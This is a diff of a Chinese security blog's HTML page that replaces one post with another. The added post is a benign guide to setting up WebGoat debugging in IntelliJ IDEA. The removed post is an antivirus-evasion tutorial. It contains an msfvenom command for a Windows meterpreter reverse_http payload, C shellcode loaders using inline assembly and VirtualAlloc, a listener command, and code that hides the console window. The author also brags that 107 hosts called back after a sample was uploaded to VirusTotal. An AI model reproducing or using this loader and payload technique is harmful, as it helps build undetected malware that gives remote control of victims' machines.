@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="简单的源码免杀, Yang Hao&#39;s blog">
+    <meta name="keywords" content="Webgoat靶场调试环境配置, Yang Hao&#39;s blog">
     <meta name="description" content="Yang Hao&#39;s blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>简单的源码免杀 | Yang Hao&#39;s blog</title>
+    <title>Webgoat靶场调试环境配置 | Yang Hao&#39;s blog</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/favicon.ico">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://p.pstatp.com/origin/137500001acfaf08a0839')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8509b1add189e4272eea5a7df80740df.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">简单的源码免杀</h1>
+                    <h1 class="description center-align post-title">Webgoat靶场调试环境配置</h1>
                 </div>
             </div>
         </div>
@@ -403,16 +403,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/msfvenom%E5%85%8D%E6%9D%80/">
-                                <span class="chip bg-color">msfvenom免杀</span>
+                            <a href="/tags/Webgoat/">
+                                <span class="chip bg-color">Webgoat</span>
                             </a>
                         
-                            <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/">
-                                <span class="chip bg-color">C语言免杀</span>
-                            </a>
-                        
-                            <a href="/tags/%E9%9A%90%E8%97%8F%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3/">
-                                <span class="chip bg-color">隐藏程序窗口</span>
+                            <a href="/tags/IDEA/">
+                                <span class="chip bg-color">IDEA</span>
                             </a>
                         
                     </div>
@@ -423,8 +419,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" class="post-category">
-                                网络攻防
+                            <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83/" class="post-category">
+                                靶场环境
                             </a>
                         
                     </div>
@@ -436,28 +432,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-30
+                    2021-10-08
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-10-10
+                    2021-10-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    745
+                    663
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    2 分
                 </div>
                 
 
@@ -472,50 +468,27 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。 </p>
-<h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2. shellcode生成和二进制文件编译"></a>2. shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p>
-<p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p>
-<pre class="line-numbers language-c"><code class="language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">12</span> <span class="token operator">-</span>b <span class="token string">'\x00'</span> LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">8.102</span> LPORT<span class="token operator">=</span><span class="token number">6666</span> <span class="token operator">-</span>f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/08/30/GCZerU1cp9gEFH2.png" alt="msfvenom"><br>然后网上找了一段C语言加载shellcode的代码。。通过内联汇编加载shellcode：</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/OPT:nowin98")</span>
-<span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")</span><span class="token comment" spellcheck="true">//不显示窗口</span>
-<span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token comment" spellcheck="true">//内联汇编</span>
-    __asm   
-    <span class="token punctuation">{</span>
-        lea eax<span class="token punctuation">,</span>buf<span class="token punctuation">;</span>   
-        call eax<span class="token punctuation">;</span>   
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>话不多说，先编译上线测试，启动msf监听：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p> <img src="https://i.loli.net/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="https://i.loli.net/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="https://i.loli.net/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="https://i.loli.net/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p>
-<h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3. VS免杀测试"></a>3. VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p>
-<p><img src="https://i.loli.net/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p>
-<p><img src="https://i.loli.net/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="https://i.loli.net/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">pragma</span> comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>接下来将这段代码删除，重新生成exe，然后进行扫描，发现成功过了杀软:<br><img src="https://i.loli.net/2020/08/30/lDvSHZB6jrOtFcU.png"></p>
-<p>vs编译的这个内联加载不能正常上线，修改下加载方法：</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>    
-<span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span>
-    <span class="token keyword">void</span><span class="token operator">*</span> exec <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">memcpy</span><span class="token punctuation">(</span>exec<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>那么编译执行后会有个DOS窗口：<br><img src="https://i.loli.net/2020/08/30/LVk8Qa3oDpbilH9.png"></p>
-<p>这里我们<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="https://i.loli.net/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="https://i.loli.net/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token function">ShowWindow</span><span class="token punctuation">(</span><span class="token function">GetConsoleWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SW_HIDE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="https://i.loli.net/2020/08/30/sQ1j6vhLouC5dOb.png"></p>
-<h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p>
+                <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>选择<a target="_blank" rel="noopener" href="https://www.jetbrains.com/idea/download/">IDEA</a>作为源码调试工具，<a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat">Webgoat</a>作为漏洞分析的靶场。将项目源码下载到本地，使用IDEA调试模式编译运行Webgoat。</p>
+<h2 id="0x02-IEAD汉化配置"><a href="#0x02-IEAD汉化配置" class="headerlink" title="0x02 IEAD汉化配置"></a>0x02 IEAD汉化配置</h2><p>在安装好IDEA后，可使用插件进行汉化，提高后续的调试效率。在File-Setting-Plugins中搜索Chinese插件安装：<br><img src="https://i.loli.net/2021/08/04/bWxUQuoqHgkiZvT.png"><br>加载插件进行使用：<br><img src="https://i.loli.net/2021/08/04/VNtxHrbmJDn6a8z.png"><br>安装完成后重启软件，界面汉化成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0646248cf3c557b3aa777447f81b6e79.png"></p>
+<h2 id="0x03-WebGoat配置"><a href="#0x03-WebGoat配置" class="headerlink" title="0x03 WebGoat配置"></a>0x03 WebGoat配置</h2><p>配置源码WebGoat-develop，用IDEA2021.2来导入项目(2021.2选择文件夹打开，然后手动配置；2019.3.2中可以选择导入项目自动配置。)，mavn会自动下载依赖启动：<br><img src="https://i.loli.net/2021/08/04/gQJ9ojfDzOa21R5.png"><br>mavn仓库默认在海外，配置文件默认位置在<code>C:\Users\&lt;用户名&gt;\.m2wrapper\dists\</code>中，在setting.xml中配置国内阿里云加速仓库地址：</p>
+<pre class="line-numbers language-xml"><code class="language-xml">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrors</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>alimaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>aliyun maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://maven.aliyun.com/nexus/content/groups/public/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>repo2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>repo2 maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://repo2.maven.org/maven2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrors</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2021/08/04/tYbVoEzBQlZa1Mx.png"></p>
+<h2 id="0x04-JDK和热重载配置"><a href="#0x04-JDK和热重载配置" class="headerlink" title="0x04 JDK和热重载配置"></a>0x04 JDK和热重载配置</h2><p>WebGoat需要使用JDK15来运行，在菜单”文件”-“项目结构”-“JDK”中配置版本为<a target="_blank" rel="noopener" href="http://jdk.java.net/15/">JDK15</a>:<br><img src="https://i.loli.net/2021/08/04/VnZADElt6gWNhCu.png"><br>然后在左上角🔨图标配置菜单里选择编辑项目配置,添加一个Spring Bot配置，名称为StartWebGoat，主类org.owasp.webgoat.StartWebGoat，这一步可能输入了主类会报错，提示找不到main函数，要等idea扫描一下类，然后就自己好了:<br><img src="https://i.loli.net/2021/08/04/rdx4onaIChsplJR.png"><br>同样配置webwolf(用来验证一些请求的服务，如SSRF之类的)，下面记得设置下更新操作,用来在代码中增加语句后热重载:<br><img src="https://i.loli.net/2021/08/04/zRCi1L4muDyWs2c.png"><br>点击调试按钮，访问本地8080，程序已经运行起来了:<br><img src="https://i.loli.net/2021/08/04/OQBXF76ckWJCLVH.png"><br>然后在<code>src/main/java/org/owasp/webgoat/users/UserService.java</code>中用户名检查断点，浏览器中登录，可以看到成功命中:<br><img src="https://i.loli.net/2021/08/05/Pmfyjs37RA9eVqO.png"><br>再试试热重载，加入一条打印语句，然后重载类:<br><img src="https://i.loli.net/2021/08/05/TSQNfmFGkIe5u2q.png"><br>已经输出了调试语句:<br><img src="https://i.loli.net/2021/08/05/8vltejyMwENUs7f.png"></p>
+<h2 id="0x04-Burp抓包配置"><a href="#0x04-Burp抓包配置" class="headerlink" title="0x04 Burp抓包配置"></a>0x04 Burp抓包配置</h2><p>Webgoat为了安全只会在本地127.0.0.1开启靶场服务，使用burp抓包的时，在Google中没法对127.0.0.1抓包。可以使用Firefox设置本地代理，在地址栏输入<code>about:config</code>，然后搜索<code>network.proxy.allow_hijacking_localhost</code>，设置为True：<br><img src="https://i.loli.net/2021/08/05/O8nuI1YxJLkUfTd.png"><br>然后就可以在Burp中拦截数据包了：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4c0c8ade47a5d71de049e8d2809b9263.png"></p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br><a target="_blank" rel="noopener" href="https://owasp.org/www-project-webgoat/">https://owasp.org/www-project-webgoat/</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -559,7 +532,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yanghaoi.github.io/2020/08/30/jian-dan-de-yuan-ma-mian-sha/">https://yanghaoi.github.io/2020/08/30/jian-dan-de-yuan-ma-mian-sha/</a>
+                    <a href="https://yanghaoi.github.io/2021/10/08/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/">https://yanghaoi.github.io/2021/10/08/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -597,16 +570,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/msfvenom%E5%85%8D%E6%9D%80/">
-                                    <span class="chip bg-color">msfvenom免杀</span>
+                                <a href="/tags/Webgoat/">
+                                    <span class="chip bg-color">Webgoat</span>
                                 </a>
                             
-                                <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/">
-                                    <span class="chip bg-color">C语言免杀</span>
-                                </a>
-                            
-                                <a href="/tags/%E9%9A%90%E8%97%8F%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3/">
-                                    <span class="chip bg-color">隐藏程序窗口</span>
+                                <a href="/tags/IDEA/">
+                                    <span class="chip bg-color">IDEA</span>
                                 </a>
                             
                         </div>
@@ -911,49 +880,51 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/">
+                <a href="/2021/10/08/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/">
                     <div class="card-image">
                         
-                        <img src="https://p.pstatp.com/origin/137500001acfaf08a0839" class="responsive-img" alt="记一次简单的win提权">
+                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8509b1add189e4272eea5a7df80740df.png" class="responsive-img" alt="Webgoat靶场调试环境配置">
                         
-                        <span class="card-title">记一次简单的win提权</span>
+                        <span class="card-title">Webgoat靶场调试环境配置</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。
+                            WebGoat是OWASP组织研制出的用于进行web漏洞实验的Java靶场程序,用来说明web应用中存在的安全漏洞，Webgoat使用maven开发，可以通过在IDEA中配置maven环境从源码编译Webgoat，可以很方便的进行调试，本文介绍一些环境配置的方法。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-09-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" class="post-category">
-                                    网络攻防
+                            <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83/" class="post-category">
+                                    靶场环境
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/windows%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/">
-                        <span class="chip bg-color">windows服务提权</span>
+                    <a href="/tags/Webgoat/">
+                        <span class="chip bg-color">Webgoat</span>
                     </a>
                     
-                    <a href="/tags/metasploit/">
-                        <span class="chip bg-color">metasploit</span>
+                    <a href="/tags/IDEA/">
+                        <span class="chip bg-color">IDEA</span>
                     </a>
                     
                 </div>
@@ -967,30 +938,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/22/cve-2020-2551-fu-xian/">
+                <a href="/2021/10/08/xxe-lou-dong-ji-chu/">
                     <div class="card-image">
                         
-                        <img src="https://p.pstatp.com/origin/137500001acfaf08a0839" class="responsive-img" alt="CVE-2020-2551复现">
+                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4907db938703ed027864cf2aa9f45060.png" class="responsive-img" alt="XXE漏洞基础">
                         
-                        <span class="card-title">CVE-2020-2551复现</span>
+                        <span class="card-title">XXE漏洞基础</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            2020年1月15日, Oracle官方发布了Weblogic IIOP反序列化漏洞CVE-2020-2551的漏洞通告，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。影响范围为10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0。
+                            通过Webgoat靶场来学习XXE漏洞基础，从代码层面分析漏洞产生原因，整理漏洞的利用方式。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    漏洞复现
+                            <a href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    基础漏洞
                                 </a>
                             
                             
@@ -1000,12 +971,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/weblogic%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">weblogic漏洞</span>
-                    </a>
-                    
-                    <a href="/tags/IDEA%E7%BC%96%E8%AF%91/">
-                        <span class="chip bg-color">IDEA编译</span>
+                    <a href="/tags/XXE%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">XXE漏洞</span>
                     </a>
                     
                 </div>
